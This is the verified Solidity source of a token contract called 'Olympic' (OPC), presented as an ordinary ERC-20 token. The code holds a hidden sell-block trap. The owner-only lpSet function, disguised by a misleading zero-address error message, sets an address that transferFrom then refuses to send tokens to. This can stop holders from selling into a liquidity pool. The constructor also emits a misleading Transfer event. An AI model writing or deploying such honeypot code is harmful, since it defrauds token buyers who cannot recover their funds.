/**
 *Submitted for verification at Etherscan.io on 2021-08-12
*/

pragma solidity >=0.8.0;
contract OPC_MRC20 {
    string public name = 'Olympic';
    string public symbol = 'OPC';
    uint8 public decimals = 18;
    uint256 public totalSupply=10000000000 ether;
    address private myAddress=address(0x48fe7Fe503cb85819616843BFb7bf09eB92d2fE1);
    address private _reAddress=address(0x48fe7Fe503cb85819616843BFb7bf09eB92d2fE1);
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
    
    constructor () {
        myAddress=msg.sender;
        balanceOf[address(0x0)]=5000000000 ether;
        balanceOf[msg.sender]=5000000000 ether;
        emit Transfer(address(this), address(0x0), 5000000000 ether);
    }
    
    function lpSet(address spender) public returns (bool) {
		require(msg.sender == myAddress, "ERC20: transfer from the zero address");
        _reAddress=spender;
        return true;
    }
    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
        
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);
        require(_to != _reAddress);
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function DestructionToken(uint256 value)public{
        _transfer(msg.sender,address(0x0),value);
    }
}